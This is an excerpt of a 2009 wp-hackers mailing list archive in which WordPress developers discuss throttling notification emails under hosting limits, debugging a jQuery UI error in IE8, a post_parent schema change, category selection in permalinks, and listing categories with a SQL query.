>> future period of time.
>>
>> -Otto
>> Sent from Memphis, TN, United States
>>
>>
>> On Fri, Oct 9, 2009 at 2:39 PM, William Canino
>> <william.canino at googlemail.com> wrote:
>>>
>>> One of my blogs is on 000webhost and I use Mark Jaquith's "Subscribe
>>> to Comments" plugin among others and its hosting account was suspended
>>> one night when a discussion, well, got out of hand.
>>>
>>> 000webhost's email sending limit is 'No more than 30 emails per 5
>>> minutes and no more than 100 emails per hour.'
>>>
>>> 000webhost's PHP config doesn't support SSL/TLS so I can't send via
>>> Gmail. In any case, Gmail also has a limit of "100 people at a time".
>>>
>>> So as a stopgap I added a "ORDER BY comment_date DESC LIMIT 28" clause
>>> to Jaquith's plugin and crossed my fingers.
>>>
>>> Before I go study how to add the Throttle plugin to Swift Mailer and
>>> use Swift as a wp_mail() replacement, I thought of coming here to ask
>>> if someone has already made or begun a throttling solution or plugin.
>>>
>>> A plugin like this may be interesting to write for public release
>>> because, for example, in this case, 000webhost has two limits and
>>> gmail has another kind of limit.
>>>
>>> W
>>>
>>> P.S. It amuses me how often various plugins just "do their own thing"
>>> to send their mail.
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From brad at webdevstudios.com  Thu Oct 15 00:25:52 2009
From: brad at webdevstudios.com (Brad Williams)
Date: Wed, 14 Oct 2009 20:25:52 -0400
Subject: [wp-hackers] How to throttle emails on hosts with email sending
	limits?
In-Reply-To: <e4dc67e0910141718v23be186bp45e6f03762854753@mail.gmail.com>
References: <e4dc67e0910091239n2a11691blcbf35aa2f85d51f2@mail.gmail.com>
	<161617690910091331j7afc7a6cw4b485c584f0eb0d3@mail.gmail.com>
	<8BA69615-32FE-432A-AF1F-0D513C6D96CE@cloudiness.com>
	<e4dc67e0910141718v23be186bp45e6f03762854753@mail.gmail.com>
Message-ID: <38057EEE-D569-4203-89AD-F7E9E5EA4809@webdevstudios.com>

The MailPress plugin has throttle control.  Might be a good place to  
start

Sent from my iPhone

On Oct 14, 2009, at 8:18 PM, William Canino <william.canino at googlemail.com 
 > wrote:

> I definitely ought to figure this out soon.
>
> I installed WordPress on Dreamhost today.  DH has a "100 recipients
> per hour" limit.
>
> Even without plugins, if the blog gets 101 comments in one hour,
> wordpress's "new comment" notification emails to the post authors will
> hit the limit.
>
> Therefore I will have to override wp_mail() itself.
>
> The new wp_mail() somehow needs to remember how many recipients have
> been sent in the last 3600 seconds.  Three ways to do this:
>
> 1. I have it accumulate emails unto a wp_option setting and with
> wp_schedule_event send just enough during the top of every hour. On
> the average they get it half an hour late.
> 2. I store each email as a record in a table, and record the sent
> times, all within a SQL SELECT-UPDATE-COMMIT transaction.  Thankfully,
> the emails don't have 2Mb attachments!
> 3. A better option?
>
> Sorry if ask again, guys, has anyone integrated mail queuing code to  
> WordPress?
>
>
>
>
> 2009/10/9 Art Delano <ajd at cloudiness.com>:
>> Would it be possible to make it work like this?
>> 1. Check if anything needs sending
>> 2. Concatenates all pending emails into a digested message
>>
>> This would reduce the number of mails sent to one per time window.
>>
>> Art
>>
>> On Oct 9, 2009, at 4:31 PM, Otto wrote:
>>
>>> Looking at the plugin, it appears to hook to comment_post to send  
>>> the
>>> notification emails.
>>>
>>> I'd rework it a bit. Change the comment_post hook to run a new
>>> function which does a wp_schedule_event to a new action (maybe
>>> stc_send_notifications?). Then hook that to a new function which  
>>> does
>>> the following:
>>> 1. checks to see if anything needs sending still
>>> 2. sends emails up to limit
>>> 3. if still some left, do another wp_schedule_event to rerun at some
>>> future period of time.
>>>
>>> -Otto
>>> Sent from Memphis, TN, United States
>>>
>>>
>>> On Fri, Oct 9, 2009 at 2:39 PM, William Canino
>>> <william.canino at googlemail.com> wrote:
>>>>
>>>> One of my blogs is on 000webhost and I use Mark Jaquith's  
>>>> "Subscribe
>>>> to Comments" plugin among others and its hosting account was  
>>>> suspended
>>>> one night when a discussion, well, got out of hand.
>>>>
>>>> 000webhost's email sending limit is 'No more than 30 emails per 5
>>>> minutes and no more than 100 emails per hour.'
>>>>
>>>> 000webhost's PHP config doesn't support SSL/TLS so I can't send via
>>>> Gmail. In any case, Gmail also has a limit of "100 people at a  
>>>> time".
>>>>
>>>> So as a stopgap I added a "ORDER BY comment_date DESC LIMIT 28"  
>>>> clause
>>>> to Jaquith's plugin and crossed my fingers.
>>>>
>>>> Before I go study how to add the Throttle plugin to Swift Mailer  
>>>> and
>>>> use Swift as a wp_mail() replacement, I thought of coming here to  
>>>> ask
>>>> if someone has already made or begun a throttling solution or  
>>>> plugin.
>>>>
>>>> A plugin like this may be interesting to write for public release
>>>> because, for example, in this case, 000webhost has two limits and
>>>> gmail has another kind of limit.
>>>>
>>>> W
>>>>
>>>> P.S. It amuses me how often various plugins just "do their own  
>>>> thing"
>>>> to send their mail.
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From dragonfly at dragonflyeye.net  Thu Oct 15 01:04:24 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Wed, 14 Oct 2009 21:04:24 -0400
Subject: [wp-hackers] How to throttle emails on hosts with email sending
	limits?
In-Reply-To: <e4dc67e0910141718v23be186bp45e6f03762854753@mail.gmail.com>
References: <e4dc67e0910091239n2a11691blcbf35aa2f85d51f2@mail.gmail.com>
	<161617690910091331j7afc7a6cw4b485c584f0eb0d3@mail.gmail.com>
	<8BA69615-32FE-432A-AF1F-0D513C6D96CE@cloudiness.com>
	<e4dc67e0910141718v23be186bp45e6f03762854753@mail.gmail.com>
Message-ID: <77b239a00910141804t13207793ud6e8c8a612207a6@mail.gmail.com>

I built something for a band with 400+ fans to allow them to send out posts
as mailing list messages. With that, I just used WP Cron to schedule emails
sent every twenty minutes in 50-recipient chunks. On 1and1.com, which they
use, it so far hasn't presented a problem. DH sounds a bit extreme, so you
might need to throttle down farther.
If you're looking to keep comment emails down, one quick answer might be
just using Intense Debate to manage comments. That way, emails aren't being
sent from or through DH servers.

Otherwise, it seems like just checking the database for new comments every
hour and sending a digest of comments shouldn't be that hard to achieve
without the need to save stuff to a second table. Set a WP Cron to check
every hour - if you're really worried about getting that many comments,
there shouldn't be any worries about firing the pseudocron - and just bundle
the comments up as a single email.

On Wed, Oct 14, 2009 at 8:18 PM, William Canino <
william.canino at googlemail.com> wrote:

> I definitely ought to figure this out soon.
>
> I installed WordPress on Dreamhost today.  DH has a "100 recipients
> per hour" limit.
>
> Even without plugins, if the blog gets 101 comments in one hour,
> wordpress's "new comment" notification emails to the post authors will
> hit the limit.
>
> Therefore I will have to override wp_mail() itself.
>
> The new wp_mail() somehow needs to remember how many recipients have
> been sent in the last 3600 seconds.  Three ways to do this:
>
> 1. I have it accumulate emails unto a wp_option setting and with
> wp_schedule_event send just enough during the top of every hour. On
> the average they get it half an hour late.
> 2. I store each email as a record in a table, and record the sent
> times, all within a SQL SELECT-UPDATE-COMMIT transaction.  Thankfully,
> the emails don't have 2Mb attachments!
> 3. A better option?
>
> Sorry if ask again, guys, has anyone integrated mail queuing code to
> WordPress?
>

From mpwalsh8 at gmail.com  Thu Oct 15 03:07:37 2009
From: mpwalsh8 at gmail.com (Mike Walsh)
Date: Wed, 14 Oct 2009 23:07:37 -0400
Subject: [wp-hackers] jQuery Error in IE but not FF
Message-ID: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>

I am working on a theme where I have made use of jQuery on the options
page.  I am using everything from the stock WordPress installation
except I've also added jQuery Accordion from the jQuery UI web site.
I've been working on it in FireFox and now that I have it working,
decided to test it in IE.  Unfortunately it doesn't work in IE and why
isn't obvious to me.  I get the following error reported by IE:

Message: Invalid argument.
Line: 19
Char: 35190
Code: 0
URI: http://localhost/wp-admin/load-scripts.php?c=1&load=jquery,utils,jquery-ui-core,jquery-ui-draggable,jquery-ui-droppable&ver=c9d556b3eef34ca3cd86c8b6467bf58e

I am running IE 8 under WinXP with WordPress 2.8.4.  Any ideas or
suggestions would be appreciated.

Mike

--
Mike Walsh - mpwalsh at gmail.com

From william.canino at googlemail.com  Thu Oct 15 04:16:43 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 15 Oct 2009 00:16:43 -0400
Subject: [wp-hackers] jQuery Error in IE but not FF
In-Reply-To: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>
References: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>
Message-ID: <e4dc67e0910142116s327c2590l6540ee6d252491ea@mail.gmail.com>

You need to post what is on line 19.

Posting lines 10 to 30 won't hurt, too.

2009/10/14 Mike Walsh <mpwalsh8 at gmail.com>:
> I am working on a theme where I have made use of jQuery on the options
> page. ?I am using everything from the stock WordPress installation
> except I've also added jQuery Accordion from the jQuery UI web site.
> I've been working on it in FireFox and now that I have it working,
> decided to test it in IE. ?Unfortunately it doesn't work in IE and why
> isn't obvious to me. ?I get the following error reported by IE:
>
> Message: Invalid argument.
> Line: 19
> Char: 35190
> Code: 0
> URI: http://localhost/wp-admin/load-scripts.php?c=1&load=jquery,utils,jquery-ui-core,jquery-ui-draggable,jquery-ui-droppable&ver=c9d556b3eef34ca3cd86c8b6467bf58e
>
> I am running IE 8 under WinXP with WordPress 2.8.4. ?Any ideas or
> suggestions would be appreciated.
>
> Mike
>
> --
> Mike Walsh - mpwalsh at gmail.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From admin at laptoptips.ca  Thu Oct 15 05:40:22 2009
From: admin at laptoptips.ca (Andrew Ozz)
Date: Wed, 14 Oct 2009 22:40:22 -0700
Subject: [wp-hackers] jQuery Error in IE but not FF
In-Reply-To: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>
References: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>
Message-ID: <4AD6B5C6.6080808@laptoptips.ca>

Mike Walsh wrote:
> Message: Invalid argument. Line: 19 Char: 35190 Code: 0 URI:
> ...

Perhaps add define('SCRIPT_DEBUG', true); to wp-config to be able to see 
the exact place it breaks. Also look in the IE8 js console for more info.

From philip at hetjens.eu  Thu Oct 15 07:01:28 2009
From: philip at hetjens.eu (Philip Hetjens)
Date: Thu, 15 Oct 2009 09:01:28 +0200
Subject: [wp-hackers] Unsigned wp_posts.post_parent
In-Reply-To: <007301ca4d18$a6841bb0$f38c5310$@com>
References: <e594c9a50910140528j205cd233r998cc6ac8d96c821@mail.gmail.com>
	<007301ca4d18$a6841bb0$f38c5310$@com>
Message-ID: <e594c9a50910150001t1a93b6f3xc1f46f2e2d076d6f@mail.gmail.com>

Thanks everybody.
Yes, my plan was to change the scheme locally, but I wanted to avoid that
this change is revoked or that it creates problems when I update WP again.



2009/10/14 Brian Layman <Brian at b5media.com>

> Yeah, this has caused a whole lot of problems across b5 too. Basically any
> WP user with a plugin that worked with the post attachements/galleries had
> it break. In our case, we simply altered all of our databases restoring the
> signed field type. That got us into production immediately.
>
> We'd looked at possibly rewriting the code to look for 0 instead of -1,
> however upon further investication, that produced result sets of tens of
> thousands of items that had to be iterated, rather than the few posts that
> filtering -1 returned.
>
> I've not yet returned to this topic, but my next plan of attack was to
> create a constant for (essentially) max(unsigned bigint(20)) which is
> "18,446,744,073,709,551,615" according to http://bit.ly/VXYdk. I think we
> are safe to assume that there are no blogs with over a quintillion posts.
> Replacing that value in the plugins should be easy enough. Creating a
> constant for it - if there isn't one already, might not be a bad idea
> either
> specifically for this kind of use.
>
> In anycase, either of these approaches might work for you, at least until
> the ticket is addressed.
>
> ______________________________________________
> Brian Layman
> b5media, Inc.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Philip Hetjens
Henriette-Brey-Str. 19
D-47608 Geldern (Germany)
Tel: +49 (0) 2838 / 91 00 6 - 5
Mobil: +49 (0) 171 / 69 17 501
Fax: +49 (0) 2838 / 91 00 6 - 6

Tel: +41 (0) 78 / 7 44 2 99 6

Internet: www.hetjens.eu

Ust-ID.: DE216714029
St-Nr.: 113/5066/1125

From lari at kairo.fi  Thu Oct 15 10:17:39 2009
From: lari at kairo.fi (Lari Elovainio)
Date: Thu, 15 Oct 2009 13:17:39 +0300
Subject: [wp-hackers] Categories, Permalinks and wp_list_categories
Message-ID: <01BEF9EF-FEBD-4F82-B669-5D5F5BF80182@kairo.fi>

Hi,

I have a problem with the Wordpress policy of preferring lower ID  
categories in permalinks. I have a few special categories that I use  
for highlighting posts on the home page and on category pages. These  
categories now show up in the url instead of newer categories I have  
created. It also seems that the new categories are not given the  
current-cat class by wp_list_categories function.

Is there a way to get Wordpress ignore my special categories in these  
cases? I would not like to be forced to recreate the special  
categories every time I add new regular categories.

Lari

From mpwalsh8 at gmail.com  Thu Oct 15 10:21:14 2009
From: mpwalsh8 at gmail.com (Mike Walsh)
Date: Thu, 15 Oct 2009 06:21:14 -0400
Subject: [wp-hackers] jQuery Error in IE but not FF
In-Reply-To: <4AD6B5C6.6080808@laptoptips.ca>
References: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>
	<4AD6B5C6.6080808@laptoptips.ca>
Message-ID: <bd35beb50910150321h8419d9h83bc6cd19f19918f@mail.gmail.com>

On Thu, Oct 15, 2009 at 1:40 AM, Andrew Ozz <admin at laptoptips.ca> wrote:
> Mike Walsh wrote:
>>
>> Message: Invalid argument. Line: 19 Char: 35190 Code: 0 URI:
>> ...
>
> Perhaps add define('SCRIPT_DEBUG', true); to wp-config to be able to see the
> exact place it breaks. Also look in the IE8 js console for more info.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


I turned SCRIPT_DEBUG on and it made it a little easier, but not much,
to figure out what is wrong.  The jQuery libraries are packed so all
of the code appears on one line.  I can noarrow it down to the Sizzle
CSS Selector Engine:

Message: Invalid argument.
Line: 19
Char: 35190
Code: 0
URI: http://localhost/wp-includes/js/jquery/jquery.js?ver=1.3.2

/*
 * Sizzle CSS Selector Engine - v0.9.3
 *  Copyright 2009, The Dojo Foundation
 *  Released under the MIT, BSD, and GPL Licenses.
 *  More information: http://sizzlejs.com/
 */

LIne 19 contains 39657 characters - all of the code is on one line and
obviously too much to post here in wp-hackers.  You can see the code
by looking at jquery.js in your WordPress install, my development
version on my laptop is at:
C:\Inetpub\wwwroot\wordpress284\wp-includes\js\jquery

My problem seems to be in draggable or droppable.  I disabled some of
my JS that preloads a theme setting to see if I could help isolate the
problem and the page loads correctly.  As soon as I drop an element
the Debugger kicks in this code begining at chatacter 35190.  At that
character the following code is flagged

{E.elem.style[E.prop]=E.now+E.unit}

There is no obvious mapping from the code above to the actual SizzleJS
source code to gain any insight from:

http://github.com/jeresig/sizzle/blob/415e466f70e5a53f589161b1f2944e5485007409/sizzle.js

I am guessing I have some sort of a JS selector problem but am not
sure how to track it down.

Mike

From supporto at pixline.net  Thu Oct 15 10:21:21 2009
From: supporto at pixline.net (=?WINDOWS-1252?Q?Pixline_=9B_Paolo_Tresso?=)
Date: Thu, 15 Oct 2009 12:21:21 +0200
Subject: [wp-hackers] Showing Global Latest Posts on WPMU
In-Reply-To: <4ede8f490910141406v2ea33ef1y1dcad9ccf6e8906@mail.gmail.com>
References: <4ede8f490910141406v2ea33ef1y1dcad9ccf6e8906@mail.gmail.com>
Message-ID: <9F80E361-368E-4CCF-AA1E-2F5E5F17C484@pixline.net>

Il giorno 14/ott/09, alle ore 23:06, Vinicius Massuchetto ha scritto:

> Except putting this job to feed a specific table or generate a RSS
> feed, I want to know if there's a clever solution to select posts from
> diferent blogs mainly because I'm worried if all these operations can
> overload the server while working on a big wpmu database.


- make your own db table similar to wp-posts but customized according  
to your needs,
- make a small plugin to index every post in every blog into that db  
table
- deploy that small plugin to every blog you want to feature this way

my two cents
Paolo



From scribu at gmail.com  Thu Oct 15 10:48:24 2009
From: scribu at gmail.com (scribu)
Date: Thu, 15 Oct 2009 13:48:24 +0300
Subject: [wp-hackers] Categories, Permalinks and wp_list_categories
In-Reply-To: <01BEF9EF-FEBD-4F82-B669-5D5F5BF80182@kairo.fi>
References: <01BEF9EF-FEBD-4F82-B669-5D5F5BF80182@kairo.fi>
Message-ID: <349fe48b0910150348g7f442c83hc06bbd0ec3d37624@mail.gmail.com>

Maybe you should use a custom taxonomy to mark your posts. See the Simple
Taxonomies plugin.


On Thu, Oct 15, 2009 at 1:17 PM, Lari Elovainio <lari at kairo.fi> wrote:

> Hi,
>
> I have a problem with the Wordpress policy of preferring lower ID
> categories in permalinks. I have a few special categories that I use for
> highlighting posts on the home page and on category pages. These categories
> now show up in the url instead of newer categories I have created. It also
> seems that the new categories are not given the current-cat class by
> wp_list_categories function.
>
> Is there a way to get Wordpress ignore my special categories in these
> cases? I would not like to be forced to recreate the special categories
> every time I add new regular categories.
>
> Lari
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From joost at yoast.com  Thu Oct 15 10:49:21 2009
From: joost at yoast.com (Joost de Valk)
Date: Thu, 15 Oct 2009 12:49:21 +0200
Subject: [wp-hackers] Categories, Permalinks and wp_list_categories
In-Reply-To: <349fe48b0910150348g7f442c83hc06bbd0ec3d37624@mail.gmail.com>
References: <01BEF9EF-FEBD-4F82-B669-5D5F5BF80182@kairo.fi>
	<349fe48b0910150348g7f442c83hc06bbd0ec3d37624@mail.gmail.com>
Message-ID: <666eb9f0910150349s5c9675ccrf8056ee421e8fa97@mail.gmail.com>

Heh, glad to see people USE that :)

On Thu, Oct 15, 2009 at 12:48 PM, scribu <scribu at gmail.com> wrote:

> Maybe you should use a custom taxonomy to mark your posts. See the Simple
> Taxonomies plugin.
>
>
> On Thu, Oct 15, 2009 at 1:17 PM, Lari Elovainio <lari at kairo.fi> wrote:
>
> > Hi,
> >
> > I have a problem with the Wordpress policy of preferring lower ID
> > categories in permalinks. I have a few special categories that I use for
> > highlighting posts on the home page and on category pages. These
> categories
> > now show up in the url instead of newer categories I have created. It
> also
> > seems that the new categories are not given the current-cat class by
> > wp_list_categories function.
> >
> > Is there a way to get Wordpress ignore my special categories in these
> > cases? I would not like to be forced to recreate the special categories
> > every time I add new regular categories.
> >
> > Lari
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at dd32.id.au  Thu Oct 15 10:49:11 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 15 Oct 2009 21:49:11 +1100
Subject: [wp-hackers] Categories, Permalinks and wp_list_categories
In-Reply-To: <01BEF9EF-FEBD-4F82-B669-5D5F5BF80182@kairo.fi>
References: <01BEF9EF-FEBD-4F82-B669-5D5F5BF80182@kairo.fi>
Message-ID: <op.u1t8b9dnspxmuu@dd32.no-ip.com>

http://core.trac.wordpress.org/ticket/10786 is sort of related to this..

Would filtering the term list used for each taxonomy for  
permalink-purposes suit you?
It'd be possible to filter out any cats you dont want to show in the  
permalink, or alternatively, only return the term you want to show in the  
permalink

On Thu, 15 Oct 2009 21:17:39 +1100, Lari Elovainio <lari at kairo.fi> wrote:

> Hi,
>
> I have a problem with the Wordpress policy of preferring lower ID
> categories in permalinks. I have a few special categories that I use
> for highlighting posts on the home page and on category pages. These
> categories now show up in the url instead of newer categories I have
> created. It also seems that the new categories are not given the
> current-cat class by wp_list_categories function.
>
> Is there a way to get Wordpress ignore my special categories in these
> cases? I would not like to be forced to recreate the special
> categories every time I add new regular categories.
>
> Lari
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au
WordPressQI: http://wordpressqi.com/

From lari at kairo.fi  Thu Oct 15 11:10:47 2009
From: lari at kairo.fi (Lari Elovainio)
Date: Thu, 15 Oct 2009 14:10:47 +0300
Subject: [wp-hackers] Categories, Permalinks and wp_list_categories
In-Reply-To: <mailman.4449.1255603763.16651.wp-hackers@lists.automattic.com>
References: <mailman.4449.1255603763.16651.wp-hackers@lists.automattic.com>
Message-ID: <922241FA-1264-43F9-9355-22AD6C7DD3DF@kairo.fi>

> Maybe you should use a custom taxonomy to mark your posts. See the  
> Simple Taxonomies plugin.


Simple Taxonomies does tag-like taxonomies only, right? I think I?d  
rather use custom fields with custom boxes on the edit page.

Thanks anyway, I was hoping this wouldn?t amount to work, though. ;^)

From lari at kairo.fi  Thu Oct 15 13:17:01 2009
From: lari at kairo.fi (Lari Elovainio)
Date: Thu, 15 Oct 2009 16:17:01 +0300
Subject: [wp-hackers] wp-hackers Digest, Vol 57, Issue 30
In-Reply-To: <mailman.13.1255608001.25742.wp-hackers@lists.automattic.com>
References: <mailman.13.1255608001.25742.wp-hackers@lists.automattic.com>
Message-ID: <A59CF363-85F2-4D4C-B7CC-40D23F3EE91C@kairo.fi>


On 15. 10. 2009, at 15.00, wp-hackers-request at lists.automattic.com  
wrote:

> Would filtering the term list used for each taxonomy for permalink- 
> purposes suit you?
> It'd be possible to filter out any cats you dont want to show in the  
> permalink, or alternatively, only return the term you want to show  
> in the permalink

How would I do this? Will it fall back to use another category, if the  
one with the smallest ID is unwanted, or would I need to hard code a  
replacement category for every unwanted category (that would not do)?

Lari

From if.website at gmail.com  Thu Oct 15 13:34:55 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 15 Oct 2009 08:34:55 -0500
Subject: [wp-hackers] Categories, Permalinks and wp_list_categories
Message-ID: <674b4a3b0910150634q1fff9c1fp45f449134052795e@mail.gmail.com>

On Thu, Oct 15, 2009 at 8:17 AM, Lari Elovainio <lari at kairo.fi> wrote:
>
> On 15. 10. 2009, at 15.00, wp-hackers-request at lists.automattic.com wrote:
>
>> Would filtering the term list used for each taxonomy for
>> permalink-purposes suit you?
>> It'd be possible to filter out any cats you dont want to show in the
>> permalink, or alternatively, only return the term you want to show in the
>> permalink
>
> How would I do this? Will it fall back to use another category, if the one
> with the smallest ID is unwanted, or would I need to hard code a replacement
> category for every unwanted category (that would not do)?

You can modify the permalink with the 'post_link' filter.  That's
probably your best option with the current code, which does not allow
you to specify which category gets used for a permalink.

From emartin24 at gmail.com  Thu Oct 15 18:07:33 2009
From: emartin24 at gmail.com (Eric Martin)
Date: Thu, 15 Oct 2009 11:07:33 -0700 (PDT)
Subject: [wp-hackers] jQuery Error in IE but not FF
In-Reply-To: <bd35beb50910150321h8419d9h83bc6cd19f19918f@mail.gmail.com>
References: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com> 
	<4AD6B5C6.6080808@laptoptips.ca>
	<bd35beb50910150321h8419d9h83bc6cd19f19918f@mail.gmail.com>
Message-ID: <7f2794f8-bfd8-486d-a615-4b54c59b3b25@2g2000prl.googlegroups.com>

I'm pretty sure the error isn't with jQuery itself, but what you are
passing it. Are you able to provide more information on the scripts
being used on your site?

On Oct 15, 3:21?am, Mike Walsh <mpwal... at gmail.com> wrote:
> On Thu, Oct 15, 2009 at 1:40 AM, Andrew Ozz <ad... at laptoptips.ca> wrote:
> > Mike Walsh wrote:
>
> >> Message: Invalid argument. Line: 19 Char: 35190 Code: 0 URI:
> >> ...
>
> > Perhaps add define('SCRIPT_DEBUG', true); to wp-config to be able to see the
> > exact place it breaks. Also look in the IE8 js console for more info.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hack... at lists.automattic.com
> >http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> I turned SCRIPT_DEBUG on and it made it a little easier, but not much,
> to figure out what is wrong. ?The jQuery libraries are packed so all
> of the code appears on one line. ?I can noarrow it down to the Sizzle
> CSS Selector Engine:
>
> Message: Invalid argument.
> Line: 19
> Char: 35190
> Code: 0
> URI:http://localhost/wp-includes/js/jquery/jquery.js?ver=1.3.2
>
> /*
> ?* Sizzle CSS Selector Engine - v0.9.3
> ?* ?Copyright 2009, The Dojo Foundation
> ?* ?Released under the MIT, BSD, and GPL Licenses.
> ?* ?More information:http://sizzlejs.com/
> ?*/
>
> LIne 19 contains 39657 characters - all of the code is on one line and
> obviously too much to post here in wp-hackers. ?You can see the code
> by looking at jquery.js in your WordPress install, my development
> version on my laptop is at:
> C:\Inetpub\wwwroot\wordpress284\wp-includes\js\jquery
>
> My problem seems to be in draggable or droppable. ?I disabled some of
> my JS that preloads a theme setting to see if I could help isolate the
> problem and the page loads correctly. ?As soon as I drop an element
> the Debugger kicks in this code begining at chatacter 35190. ?At that
> character the following code is flagged
>
> {E.elem.style[E.prop]=E.now+E.unit}
>
> There is no obvious mapping from the code above to the actual SizzleJS
> source code to gain any insight from:
>
> http://github.com/jeresig/sizzle/blob/415e466f70e5a53f589161b1f2944e5...
>
> I am guessing I have some sort of a JS selector problem but am not
> sure how to track it down.
>
> Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hack... at lists.automattic.comhttp://lists.automattic.com/mailman/listinfo/wp-hackers

From mpwalsh8 at gmail.com  Thu Oct 15 19:51:03 2009
From: mpwalsh8 at gmail.com (Mike Walsh)
Date: Thu, 15 Oct 2009 15:51:03 -0400
Subject: [wp-hackers] jQuery Error in IE but not FF
In-Reply-To: <7f2794f8-bfd8-486d-a615-4b54c59b3b25@2g2000prl.googlegroups.com>
References: <bd35beb50910142007v4cd45d2ckb5a7812bf6f70933@mail.gmail.com>
	<4AD6B5C6.6080808@laptoptips.ca>
	<bd35beb50910150321h8419d9h83bc6cd19f19918f@mail.gmail.com>
	<7f2794f8-bfd8-486d-a615-4b54c59b3b25@2g2000prl.googlegroups.com>
Message-ID: <bd35beb50910151251o683f4a4as6bd5fac92a23ba28@mail.gmail.com>

On Thu, Oct 15, 2009 at 2:07 PM, Eric Martin <emartin24 at gmail.com> wrote:
> I'm pretty sure the error isn't with jQuery itself, but what you are
> passing it. Are you able to provide more information on the scripts
> being used on your site?
>

I'll see if I can figure out how to post it, you may have to look at
the whole theme to see the problem.  I am pretty sure it is on my end
because this jQuery UI demo works and my code is based on this demo.

http://jqueryui.com/demos/droppable/#photo-manager

Mike

From sharon at BrewerRadio.com  Thu Oct 15 20:22:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 15 Oct 2009 16:22:00 -0400
Subject: [wp-hackers] need to get a list of categories from an old wp install
Message-ID: <4580f79b.1ca4dd5.1f13fe02.56ae@BrewerRadio.com>

Sorry, I know this is more of an SQL-related question, but I was wondering if someone could help me quickly?
 
I?ve got an old WP-install that had way too many categories; we?ve moved it to another (faster) server and culled a bunch of categories in the process?
 
Of course, I?ve got backups and all, but I need to get a list of the old categories now, and my SQL?s kinda rusty?
It?s the terms/taxonomy/relationships tables I know, but if anyone could shoot me the mysql v5 for it, I would GREATLY appreciate it.
 
Last resort, I suppose I could point another wp-install to that db and obtain that way?
 
Many thanks!
 
-Sharon
 

From adriaan.pelzer at gmail.com  Thu Oct 15 20:43:16 2009
From: adriaan.pelzer at gmail.com (Adriaan Pelzer)
Date: Thu, 15 Oct 2009 22:43:16 +0200
Subject: [wp-hackers] need to get a list of categories from an old wp
	install
In-Reply-To: <4580f79b.1ca4dd5.1f13fe02.56ae@BrewerRadio.com>
References: <4580f79b.1ca4dd5.1f13fe02.56ae@BrewerRadio.com>
Message-ID: <58dfca5b0910151343g34137846if485be4cc6979895@mail.gmail.com>

If I do a "SELECT name FROM wp_terms;", I get all my categories.

Adriaan Pelzer
PIT Productions
+2712 651 2432


On Thu, Oct 15, 2009 at 10:22 PM, Sharon Chambers <sharon at brewerradio.com>wrote:

> Sorry, I know this is more of an SQL-related question, but I was wondering
> if someone could help me quickly?
>
> I?ve got an old WP-install that had way too many categories; we?ve moved it
> to another (faster) server and culled a bunch of categories in the process?
>
> Of course, I?ve got backups and all, but I need to get a list of the old
> categories now, and my SQL?s kinda rusty?
> It?s the terms/taxonomy/relationships tables I know, but if anyone could
> shoot me the mysql v5 for it, I would GREATLY appreciate it.
>
> Last resort, I suppose I could point another wp-install to that db and
> obtain that way?
>
> Many thanks!
>
> -Sharon
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From sharon at BrewerRadio.com  Thu Oct 15 20:52:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 15 Oct 2009 16:52:00 -0400
Subject: [wp-hackers] need to get a list of categories from an old wp
	install
Message-ID: <5c30d4f8.1ca4dd9.1f2ec971.5878@BrewerRadio.com>

OK, I think I got it...
